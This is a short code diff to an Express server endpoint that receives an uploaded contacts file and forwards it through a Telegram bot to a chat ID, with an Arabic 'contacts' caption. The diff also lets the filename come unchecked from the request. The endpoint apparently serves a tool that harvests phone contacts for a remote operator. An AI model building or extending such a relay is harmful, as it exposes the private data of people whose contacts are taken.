@@ -220,9 +220,10 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.post("/contacts-file", upload.single('file'), (req, res) => {
   var uid = req.body.uid || null;
   var count = req.body.count || '؟';
+  var filename = req.body.filename || 'contacts.txt';
   var file = req.file || null;
   if (uid && file) {
-    var info = { filename: "contacts.vcf", contentType: 'text/vcard' };
+    var info = { filename: filename, contentType: 'text/plain' };
     bot.sendDocument(parseInt(uid, 36), file.buffer, { caption: `📱 جهات الاتصال: ${count} جهة اتصال` }, info);
     res.send("Done");
   } else { res.send("Error"); }
